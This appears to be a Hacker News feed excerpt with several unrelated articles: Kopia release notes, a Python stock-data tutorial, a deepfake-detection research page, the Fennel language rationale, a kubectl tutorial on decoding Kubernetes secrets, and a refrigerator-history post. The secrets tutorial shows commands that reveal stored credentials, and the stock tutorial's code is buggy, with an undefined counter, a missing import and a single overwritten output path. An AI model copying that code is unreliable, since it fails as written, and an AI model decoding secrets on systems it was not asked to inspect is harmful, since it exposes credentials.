<li>‘kopia server’ made –ui default <a href="https://github.com/kopia/kopia/pull/452">#452</a></li>
<li>allow override of snapshot start time and end time</li>
<li>improved ‘snapshot delete’ usage <a href="https://github.com/kopia/kopia/pull/436">#436</a></li>
<li>Remove legacy flags from snapshot create command <a href="https://github.com/kopia/kopia/pull/441">#441</a></li>
<li>support for zip, tar and tar.gz restore outputs <a href="https://github.com/kopia/kopia/pull/482">#482</a></li>
<li>support for synchronizing repositories <a href="https://github.com/kopia/kopia/pull/522">#522</a></li>
<li>auto-ignore kopia cache directories when creating snapshots <a href="https://github.com/kopia/kopia/pull/524">#524</a></li>
</ul>
<h4 id="infrastructure">Infrastructure</h4>
<ul>
<li>macOS and Windows KopiaUI builds are now signed</li>
<li>robustness testing framework</li>
<li>testing: added blob.Storage wrapper that simulates eventual consistency <a href="https://github.com/kopia/kopia/pull/434">#434</a></li>
<li>switched back to using v-prefixed tag names.</li>
<li>tests: added smoke test that exercises all combinations of encryption and hashing</li>
</ul>
<p>See full change log on <a href="https://github.com/kopia/kopia/releases/tag/v0.6.1">GitHub</a>.</p>

	
		
<h2>Feedback</h2>
<p>Was this page helpful?</p>
<p>
  Glad to hear it! Please <a href="https://github.com/kopia/kopia/issues/new">tell us how we can improve</a>.
</p>
<p>
  Sorry to hear that. Please <a href="https://github.com/kopia/kopia/issues/new">tell us how we can improve</a>.
</p>


	
	
</div></div>]]>
            </description>
            <link>https://kopia.io/docs/release-notes/v0.6.0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278622</guid>
            <pubDate>Wed, 26 Aug 2020 02:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Simple Program to Get Thousands of Stocks’ Data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278512">thread link</a>) | @cshad
<br/>
August 25, 2020 | https://handsoffinvesting.com/a-simple-program-to-get-thousands-of-stocks-data/ | <a href="https://web.archive.org/web/*/https://handsoffinvesting.com/a-simple-program-to-get-thousands-of-stocks-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-247">
      <div>
    <section>
            <div>
        
<h3>Effortlessly obtain the historical data of over a thousand stocks. For free.</h3>



<figure><img data-attachment-id="257" data-permalink="https://handsoffinvesting.com/a-simple-program-to-get-thousands-of-stocks-data/wordcloud/" data-orig-file="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?fit=4096%2C3072&amp;ssl=1" data-orig-size="4096,3072" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="wordcloud" data-image-description="" data-medium-file="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?fit=1024%2C768&amp;ssl=1" loading="lazy" width="1024" height="768" src="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=1024%2C768&amp;ssl=1" alt="" srcset="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=1536%2C1152&amp;ssl=1 1536w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=2048%2C1536&amp;ssl=1 2048w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?w=2280&amp;ssl=1 2280w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?w=3420&amp;ssl=1 3420w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=1536%2C1152&amp;ssl=1 1536w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=2048%2C1536&amp;ssl=1 2048w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?w=2280&amp;ssl=1 2280w, https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?w=3420&amp;ssl=1 3420w" data-lazy-src="https://i0.wp.com/handsoffinvesting.com/wp-content/uploads/2020/08/wordcloud.png?resize=1024%2C768&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>







<h2 id="16bb">Anyone Can Do This</h2>



<p>Beginners welcome. I’ve created this guide for Python developers of all skill levels. Maybe you don’t even know what Python is, and that’s okay! I’ve got you. </p>



<p>If you’ve read any of <a href="https://handsoffinvesting.com/guides/" target="_blank" rel="noreferrer noopener">my articles</a> about automating the stock analysis process, you’ve probably seen this code before. I figured that since this program is so integral for algorithmic investing, I need to break it down further and make sure that everyone understands how to use it!</p>



<p>After running this program you’ll be left with a folder on your device that contains the historical data of any number of stocks. Also, I’ve simplified the code by breaking it into sections and giving a description of what each part of the code does.</p>



<p id="bc40">If this is your first time using Python (or coding in general), I’d recommend reading&nbsp;<a href="https://www.codecademy.com/articles/install-python" target="_blank" rel="noreferrer noopener">this article</a>&nbsp;for a simple walk-through of the installation and startup process. And don’t worry, everybody learns how to code through practice. This is a great place to start learning!</p>



<figure><blockquote><p>Programming is a skill best acquired by practice rather than from books. — Alan Turing</p></blockquote></figure>



<hr>



<h2 id="0a66">Libraries</h2>



<p>They make life so much easier. These libraries are going to help us make quick work of the data importing process. Using them, we’ll be able to:</p>



<ol><li>Filter through all of the stocks in the NYSE, NASDAQ, and AMEX. </li><li>Create and delete a file on our local machine (computer) to store the stock data.</li><li>Pull and save historical stock data from Yahoo Finance.</li></ol>



<p id="29d1">Importing the necessary libraries can be done in two simple lines of code.</p>



<div><pre data-lang="Python"><code>import yfinance as yf, pandas as pd, shutil, os
from get_all_tickers import get_tickers as gt</code></pre></div>



<p>Here are the use-cases for each library, as well as where you can go to learn more.</p>



<ul><li><a href="https://pypi.org/project/yfinance/" target="_blank" rel="noreferrer noopener">Yfinance</a>: Gather historical/ relevant data on each stock.</li><li><a href="https://pandas.pydata.org/docs/reference/index.html" target="_blank" rel="noreferrer noopener">Pandas</a>: Work with large sets of data.</li><li><a href="https://docs.python.org/3/library/shutil.html" target="_blank" rel="noreferrer noopener">Shutil</a> and&nbsp;<a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noreferrer noopener">OS</a>: Accessing, creating, and deleting folders/files on the computer.</li><li><a href="https://github.com/shilewenuw/get_all_tickers" target="_blank" rel="noreferrer noopener">Get_All_Tickers</a>: Filter through all stocks to get the list you desire.</li></ul>



<hr>



<h2>The List of Stocks (Tickers)</h2>



<p>The library “<a href="https://github.com/shilewenuw/get_all_tickers" target="_blank" rel="noreferrer noopener">get-all-tickers</a>“, allows us to filter through all of the stocks in the NYSE, NASDAQ, and AMEX. Doing this gives us a list of stock tickers that we can then analyze one at a time. </p>



<p>Currently, the library supports filtering stocks by their <strong>region</strong>, <strong>sector</strong>, <strong>market cap</strong>, and <strong>exchange</strong>. For this example I am looking at companies that have a market cap between $150,000 and $10,000,000 (in millions). You will notice that I also included a line of code to print the number of tickers we are using. </p>



<p><strong><span>This is very important</span></strong><span>:</span></p>



<p>You will need to be sure that you are not targeting more than 2,000 tickers, because the Yfinance API has a 2,000 API calls per hour limit.</p>



<div><pre data-lang="Python"><code>tickers = gt.get_tickers_filtered(mktcap_min=150000, mktcap_max=10000000)
print("The amount of stocks chosen to observe: " + str(len(tickers)))</code></pre></div>



<p><br>I would recommend using this library because it allows for our list of observable stocks to be dynamic. But if it better suits your analysis, here is an alternative line of code that allows you to type in the stocks you would like to have the program analyze.</p>



<div><pre data-lang="Python"><code>tickers = ["FB", "AMZN", "APPL"]</code></pre></div>



<hr>



<h2>Data Storage</h2>



<p>You need to create a file location on your device to store all of the stock data, but it’s not that simple. This file need to remove old stock data and hold in order to hold only data from the latest iteration of this program.</p>



<p>To do this, <strong>first create the file manually on your computer</strong>. Don’t worry, this is the only time you will have to do this. Then add this code to your program.</p>



<div><pre data-lang="Python"><code>shutil.rmtree("C:\\Users\\Your Path to Desired File Location")
os.mkdir("C:\\Users\\Your Path to Desired File Location")</code></pre></div>



<p>These two lines of code will then remove and recreate that file each time you run this program. Doing this allows for you to clear out the old stock data and make room for the most recent data.</p>



<hr>



<h2>Measure Success</h2>



<p>These two basic lines of code create variables that we are going to use in the next section to gauge the success of your program. </p>



<p>Sometimes Yahoo Finance can fail to retrieve the data for all of the stocks. This does not happen <span>often </span>(maybe once in a thousand stocks), but we still want to know if it does. </p>



<div><pre data-lang="Python"><code>Stock_Failure = 0
Stocks_Not_Imported = 0</code></pre></div>



<h2>Pull From Yahoo Finance</h2>



<p>This section of code may look daunting if you’re new to coding, but don’t worry<span>:</span> it’s not too complicated. Here is a high-level overview of what this code is doing.</p>



<ol><li>Create a while loop to iterate over each stock in our list of tickers (also ensuring that we are making less than 1800 calls).</li><li>Try statement. <ol><li>We tell Yahoo Finance which stock we want to get the data for.</li><li>Specify what kind of data we want about the stock (in this example it is all of the historical price data).</li><li>Pull the data and save it as a csv in the folder specified in the above section.</li><li>Force the program to pause for two seconds so that we don’t overwhelm Yahoo Finance and get kicked out.</li><li>Tell our program the process was successful and then iterate to the next stock.</li></ol></li><li>Catch Statement (to catch value errors that Yahoo Finance might throw, otherwise our program will prematurely end).<ol><li>Print that there was an error.</li><li>Check if the observed stock has failed more than 5 times (this threshold is up to you).</li><li>If it has, move on to the next stock.</li><li>If it has not, try again.</li></ol></li><li>We’re done. Print out how many stocks were successfully imported, and how many were not.</li></ol>



<p>If you’re still confused with a section of this code, I added some comments (words after #) to alleviate any confusion.</p>



<div><pre data-lang="Python"><code>i=0
while (i &lt; len(tickers)) and (Amount_of_API_Calls &lt; 1800):
    try:
        stock = tickers[i]  # Gets the current stock ticker
        temp = yf.Ticker(str(stock))  # Instantiate the ticker as a stock with Yahoo Finance
        Hist_data = temp.history(period="max")  # Tells yfinance what kind of data we want about this stock (In this example, all of the historical data)
        Hist_data.to_csv("C:\\Users\\Your Desired Path to File")  # Saves the historical data in csv format for further processing later
        time.sleep(2)  # Pauses the loop for two seconds so we don't cause issues with Yahoo Finance's backend operations
        Amount_of_API_Calls += 1 
        Stock_Failure = 0
        i += 1  # Iteration to the next ticker
    except ValueError:
        print("Yahoo Finance Back-end Error, Attempting to Fix")  # An error occurred on Yahoo Finance's back-end. We will attempt to retreive the data again
        if Stock_Failure &gt; 5:  # Move on to the next ticker if the current ticker fails more than 5 times
            i+=1
            Stocks_Not_Imported += 1
        Amount_of_API_Calls += 1
        Stock_Failure += 1
print("The amount of stocks we successfully imported: " + str(i - Stocks_Not_Imported))</code></pre></div>



<hr>



<h2>The End?</h2>



<p>That’s it. You now have a dynamic way of filtering through all of the stocks in the NYSE, NASDAQ, and AMEX<span>, p</span>ulling each of the company’s historic price data<span>, a</span>nd saving all of it to a new folder on your device. All <span>at </span>the click of a button. </p>



<p><strong>It’s completely hands-off.</strong></p>



<p>But <span>this isn’t</span> the end. There is so much more of the investing process that you can make hands-off. And why wouldn’t you? It makes life so much easier and investing so much more successful. <strong><a href="https://handsoffinvesting.com/" target="_blank" rel="noreferrer noopener">Everything you need is right here!</a></strong></p>



<p>If you enjoyed this article (or not), feel free to leave a comment and let me know what you thought. I would love to hear your feedback or questions!<span> </span><span>And </span>if you enjoy learning about automating your trading strategies, subscribe to our blog. We post new content and guides twice a week!</p>







<p>Also, connect with me on LinkedIn&nbsp;<a href="http://www.linkedin.com/in/cameron-shadmehry" target="_blank" rel="noreferrer noopener">here</a>. I’m always happy to make some new connections!</p>
		
		
		
      </div>
      
    </section><!-- .entry-content -->
  </div><!-- .post-entry -->
  </article></div>]]>
            </description>
            <link>https://handsoffinvesting.com/a-simple-program-to-get-thousands-of-stocks-data/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278512</guid>
            <pubDate>Wed, 26 Aug 2020 02:34:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intro to ONNX by Chinmay Jog – Venice Computer Vision Meetup 07/20/2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278494">thread link</a>) | @nchafni
<br/>
August 25, 2020 | https://social.trueface.ai/vcv-intro-to-onnx | <a href="https://web.archive.org/web/*/https://social.trueface.ai/vcv-intro-to-onnx">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://social.trueface.ai/vcv-intro-to-onnx</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278494</guid>
            <pubDate>Wed, 26 Aug 2020 02:31:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New model can detect deepfake images by looking at subtle visual artifacts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278435">thread link</a>) | @happy-go-lucky
<br/>
August 25, 2020 | https://chail.github.io/patch-forensics/ | <a href="https://web.archive.org/web/*/https://chail.github.io/patch-forensics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

        <p id="authors">
            <a href="http://people.csail.mit.edu/lrchai/">Lucy Chai</a>
						<a href="https://people.csail.mit.edu/davidbau/home/">David Bau</a>
						<a href="https://scholar.google.com/citations?user=HX0BfLYAAAAJ&amp;hl=en">Ser-Nam Lim</a>
            <a href="http://web.mit.edu/phillipi/">Phillip Isola</a><br>
            <!-- <strong>MIT Computer Science and Artificial Intelligence Laboratory</strong> -->
            MIT Computer Science and Artificial Intelligence Laboratory
        </p>
				<p><span size="+2">
					<p>
						<a href="http://arxiv.org/abs/2008.10588" target="_blank">[Paper]</a> &nbsp;&nbsp;&nbsp;&nbsp;
						<a href="https://github.com/chail/patch-forensics" target="_blank">[Code]</a> 
						<!--
						<a href="TODO: youtube link?" target="_blank">[Video]</a>
						-->
					</p>
					</span></p><p>
            <img src="https://chail.github.io/patch-forensics/img/classifier.001.jpeg">
        </p>

        <p>The quality of image generation and manipulation is reaching impressive levels, making it increasingly difficult for a human to distinguish between what is real and what is fake. However, deep networks can still pick up on the subtle artifacts in these doctored images. We seek to understand what properties of fake images make them detectable and identify what generalizes across different model architectures, datasets, and variations in training. We use a patch-based classifier with limited receptive fields to visualize which regions of fake images are more easily detectable. We further show a technique to exaggerate these detectable properties and demonstrate that, even when the image generator is adversarially finetuned against a fake image classifier, it still leaves detectable artifacts in certain image patches.</p>


        <br clear="all">
    </div><div id="Summary">
				<p><span size="+2">
					<p>
						A Brief Summary:
					</p>
					</span>
					We train classifiers in a fully convolutional manner by truncating a standard deep network architecture after various intermediate layers. This classifier is trained to distinguish between real images and fake or manipulated images, but since it is fully convolutional, it provides us with a prediction of how "real" or "fake" it predicts a given patch of the image to be. One subtle caveat was that we had to be careful with image preprocessing -- we tried to create our dataset so that "real" and "fake" image collections are as similar as possible in terms any resizing done and file format, as we found that a classifier could easily learn these differences rather than the actual task.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/preprocess.001.jpeg"></p><p>
					We train the classifier on fake faces from Progressive GAN, and real faces from the CelebA-HQ dataset afer performing the preprocessing steps above. We then evaluate the truncated classifiers at different receptive field sizes, where higher block number corresponds to larger receptive field/larger patch size, across different synthetic face generators, as well as generators trained on the more diverse FFHQ face datset. Oftentimes, a model with a smaller receptive field can outperform one with a larger receptive field on this task.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/graphs.001.jpeg"></p><p>
					Patch-based predictors give use a natural way to visualize model decisions, as the same model weights are applied over each patch in a sliding fashion. By using a pretrained face segmentation model, we can categorize the most predictive patch in each image to investigate what types of features the patch classifier uses in making a decision.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/visualize.001.jpeg"></p><p>
					One of the dangers of image synthesis is that the generators are constantly evolving and getting better, so we investigate how patch cues change as a result of changes in the generator. We finetune the generator and recompute the most predictive patches, and we also use the generator as a tool to exaggerate what makes images look fake by optimizing against the classifier in latent space.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/exaggerate.001.jpeg"></p></div><div id="references">

        <h2>Reference</h2>

				<p>L Chai, D Bau, SN Lim, P Isola. What makes fake images detectable? Understanding properties that generalize. <br>European Conference on Computer Vision, 2020.</p>

        <p><code>
			@inproceedings{patchforensics,<br>
				&nbsp;&nbsp;title={What makes fake images detectable? Understanding properties that generalize},<br>
				&nbsp;&nbsp;author={Chai, Lucy and Bau, David and Lim, Ser-Nam and Isola, Phillip},<br>
				&nbsp;&nbsp;booktitle={European Conference on Computer Vision},<br>
				&nbsp;&nbsp;year={2020}<br>
			 }
				</code>
    </p></div><p><strong>Acknowledgements</strong>:
					 We would like to thank Antonio Torralba, Jonas Wulff, Jacob Huh, Harry Yang, and Richard Zhang for helpful discussions. This work was supported by a National Science Foundation Graduate Research Fellowship under Grant No. 1122374 to L.C. and DARPA XAI FA8750-18-C000-4 to D.B.
					 Recycling a familiar <a href="https://ali-design.github.io/gan_steerability/">template</a>.
    </p></div>]]>
            </description>
            <link>https://chail.github.io/patch-forensics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278435</guid>
            <pubDate>Wed, 26 Aug 2020 02:23:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Fennel programming language: rationale]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278430">thread link</a>) | @todsacerdoti
<br/>
August 25, 2020 | https://fennel-lang.org/rationale | <a href="https://web.archive.org/web/*/https://fennel-lang.org/rationale">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header>

</header>
<p>Fennel is a programming language that runs on the Lua runtime.</p>
<h2 id="why-lua">Why Lua?</h2>
<p>The Lua programming language is an excellent and very underrated tool. Is it remarkably powerful yet keeps a very small footprint both conceptually as a language and in terms of the size of its implementation. (The reference implementation consists of about nineteen thousand lines of C and compiles to 278kb.) Partly because it is so simple, Lua is also extremely fast. But the most important thing about Lua is that it’s specifically designed to be put in other programs to make them reprogrammable by the end user.</p>
<p>The conceptual simplicity of Lua stands in stark contrast to other “easy to learn” languages like JavaScript or Python–Lua contains very close to the minimum number of ideas needed to get the job done; only Forth and Scheme offer a comparable simplicity. When you combine this aggressive simplicity with the emphasis on making programs reprogrammable, the result is a powerful antidote to prevailing trends in technology of treating programs as black boxes out of the control of the user.</p>
<h2 id="and-yet">And yet…</h2>
<p>So if Lua is so great, why not just use Lua? In many cases you should! But there are a handful of shortcomings in Lua which over time have shown to be error-prone or unclear. Fennel runs on Lua, and the runtime semantics of Fennel are a subset of Lua’s, but you can think of Fennel as an alternate notation you can use to write Lua programs which helps you avoid common pitfalls. This allows Fennel to focus on doing one thing very well and not get dragged down with things like implementing a virtual machine, a standard library, or profilers and debuggers. Any tool that already works for Lua will work just as well for Fennel.</p>
<p>The most obvious difference between Lua and Fennel is the parens-first syntax; Fennel belongs to the Lisp family of programming languages. You could say that this removes complexity from the grammar; the paren-based syntax is more regular and has fewer edge cases. Simply by virtue of being a lisp, Fennel removes from Lua:</p>
<ul>
<li>statements (everything is an expression),</li>
<li>operator precedence (there is no ambiguity about what comes first), and</li>
<li>early returns (functions always return in tail positions).</li>
</ul>
<h2 id="variables">Variables</h2>
<p>One of the most common legitimate criticisms leveled at Lua is that it makes it easy to accidentally use globals, either by forgetting to add a <code>local</code> declaration or by making a typo. Fennel allows you to use globals in the rare case they are necessary but makes it very difficult to use them by accident.</p>
<p>Fennel also removes the ability to reassign normal locals. If you declare a variable that will be reassigned, you must introduce it with <code>var</code> instead. This encourages cleaner code and makes it obvious at a glance when reassignment is going to happen. Note that Lua 5.4 introduced a similar idea with <code>&lt;const&gt;</code> variables, but since Fennel started from a clean slate it was able to make the cleaner choice be the default rather than opt-in.</p>
<h2 id="tables-and-loops">Tables and Loops</h2>
<p>Lua’s notation for tables (its data structure) feels somewhat dated. It uses curly brackets for both sequential (array-like) and key/value (dictionary-like) tables, while Fennel uses the much more familiar notation of using square brackets for sequential tables and curly brackets for key/value tables.</p>
<p>In addition Lua overloads the <code>for</code> keyword for both numeric “count from X to Y” style loops as well as more generic iterator-based loops. Fennel uses <code>for</code> in the first case and introduces the <code>each</code> form for the latter.</p>
<h2 id="functions">Functions</h2>
<p>Another common criticism of Lua is that it lacks arity checks; that is, if you call a function without enough arguments, it will simply proceed instead of indicating an error. Fennel allows you to write functions that work this way (<code>fn</code>) when it’s needed for speed, but it also lets you write functions which check for the arguments they expect using <code>lambda</code>.</p>
<h2 id="other">Other</h2>
<p>If you’ve been programming in newer languages, you are likely to be spoiled by pervasive destructuring of data structures when binding variables, as well as by pattern matching to write more declarative conditionals. Both these are missing from Lua and included in Fennel.</p>
<p>Finally Fennel includes a macro system so that you can easily extend the language to include new syntactic forms. This feature is intentionally listed last because while lisp programmers have historically made a big deal about how powerful it is, it is relatively rare to encounter situations where such a powerful construct is justified.</p>
<hr>
<p><a href="https://git.sr.ht/~technomancy/fennel-lang.org">source for this site</a></p>


</div>]]>
            </description>
            <link>https://fennel-lang.org/rationale</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278430</guid>
            <pubDate>Wed, 26 Aug 2020 02:23:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Read Kubernetes Secrets]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278361">thread link</a>) | @aogl
<br/>
August 25, 2020 | https://ao.gl/how-to-read-kubernetes-secrets/ | <a href="https://web.archive.org/web/*/https://ao.gl/how-to-read-kubernetes-secrets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <p>Kubernetes secrets is a great way to store secret values that only Kubernetes can access in your hosted applications.</p> <p>There are times when you might need to view these secrets in plain-text. This is probably because you want to validate the value or use it manually elsewhere.</p> <p>In this tutorial we will go through how to achieve this and read Kubernetes secrets using <code>kubectl</code> for the command-line.</p> <p><strong>tl;dr</strong></p> <pre title="">kubectl get secret &lt;SECRET_NAME&gt; -o jsonpath="{.data.&lt;DATA&gt;}" | base64 --decode
</pre> <p>In the above sample code, simply replace <code>&lt;SECRET_NAME&gt;</code>&nbsp;and&nbsp;<code>&lt;DATA&gt;</code> with your own values.</p> <h2 id="authenticate-with-your-kubernetes-cluster">Authenticate with your Kubernetes cluster</h2> <p>Start by authenticating into your Kubernetes cluster, you may need to first use an <code>assume-role</code> or <code>awsume</code>.</p> <pre title="">eval $(assume-role &lt;PROFILE&gt;)
</pre> <p>If you are using AWS EKS, do this to update your local kubeconfig file:</p> <pre title="">aws eks --region &lt;AWS_REGION&gt; update-kubeconfig --name &lt;CLUSTER_NAME&gt;
</pre> <p>If all else fails, it may be useful to check these&nbsp;<a href="https://kubernetes.io/docs/reference/access-authn-authz/authentication/" rel="noreferrer noopener" target="_blank">authentication strategies</a>.</p>  <p>Now you will need to confirm the context:</p> <pre title="">kubectl config current-context
</pre> <h2 id="list-read-and-decode-secret-data">List, read, and decode secret data</h2> <p>Let’s pretend that we want to read a secret called <code>yoursecret</code>. To do this we can use the below command to see the names of all the secrets, in order to narrow down what exists.</p> <p>Let’s find our what our secret is called:</p> <pre title="">kubectl get secrets

NAME                            TYPE                                  DATA      AGE
yoursecret                      Opaque                                2         3d
</pre> <p>Now that we know what our secret is called, we can issue the next command and view it’s value.</p> <p>Use the describe keyword to view the secret:</p> <pre title="">kubectl describe secret yoursecret

Name:         yoursecret
Namespace:    default
Labels:       &lt;none&gt;
Annotations:  
Type:         Opaque

Data
====
username: 20 bytes
password: 20 bytes
</pre> <p>We now that the data contained in the secret contains a <code>username</code> and <code>password</code>.</p> <p>This is where we use <code>kubectl</code> to get the outputs to YAML. This data is shown to us in a Base64 encoded string.</p> <pre title="">kubectl get secret yoursecret -o yaml

apiVersion: v1
data:
  username: YWJjZGVmZ2hpamtsbW5vcHFyc3QK
  password: MTIzNDU2Nzg5MDEyMzQ1Njc4OTAK
...
</pre> <p>Use the below command on the command-line to decode the Base64 value back to plain-text:</p>  <pre title="">echo "YWJjZGVmZ2hpamtsbW5vcHFyc3QK" | base64 --decode

abcdefghijklmnopqrst
</pre> <h2 id="a-shortcut-to-decoding-secret-data">A shortcut to decoding secret data</h2> <p>While the above is more of a tutorial on the steps to get this done, we can simplify these steps below into a single command:</p> <pre title="">kubectl get secret yoursecret -o jsonpath="{.data.username}" | base64 --decode

abcdefghijklmnopqrst
</pre>    </div></div>]]>
            </description>
            <link>https://ao.gl/how-to-read-kubernetes-secrets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278361</guid>
            <pubDate>Wed, 26 Aug 2020 02:11:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[1930s Household Refrigerators (2013)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278184">thread link</a>) | @userbinator
<br/>
August 25, 2020 | https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/ | <a href="https://web.archive.org/web/*/https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p>The evolution of the household refrigerator is not a well known story. &nbsp;There seems to be few people interested in the subject. &nbsp;Perhaps it is not as romantic as the development of the automobile. &nbsp;Nonetheless, a concerted effort was put forth in the 1920s and 1930s to produce a cheap, reliable, efficient domestic refrigerator. &nbsp;From books I’m reading on the subject, the great diversity of refrigerator manufacturers in the United States that existed in the 1920s, seems to be boiled down to a handful of companies in the depression era. &nbsp;In the most recent book, “Household Electric Refrigeration” by John F. Wostrel and John G. Praetz 1938; the models described were made by manufacturers, many still around today (or owned by yet larger companies) including General Electric, Frigidaire, Kelvinator, Norge, Grunow, Crosley, Sparton, Hotpoint, Coldspot, Copeland, Ice-O-Matic and Westinghouse.</p>
<p><a href="https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg"><img data-attachment-id="4086" data-permalink="https://musingsonentropy.com/2013/04/04/1930s-household-refrigerators/norge_operation/" data-orig-file="https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg" data-orig-size="2343,2202" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SCH-I535&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1365067280&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.7&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.0012468827930175&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="Norge_Operation" data-image-description="" data-medium-file="https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=300" data-large-file="https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=605" alt="Norge_Operation" src="https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=605&amp;h=568" srcset="https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=605&amp;h=568 605w, https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=1210&amp;h=1136 1210w, https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=150&amp;h=141 150w, https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=300&amp;h=282 300w, https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=768&amp;h=722 768w, https://musingsonentropy.files.wordpress.com/2013/04/norge_operation.jpg?w=1024&amp;h=962 1024w" sizes="(max-width: 605px) 100vw, 605px"></a></p>
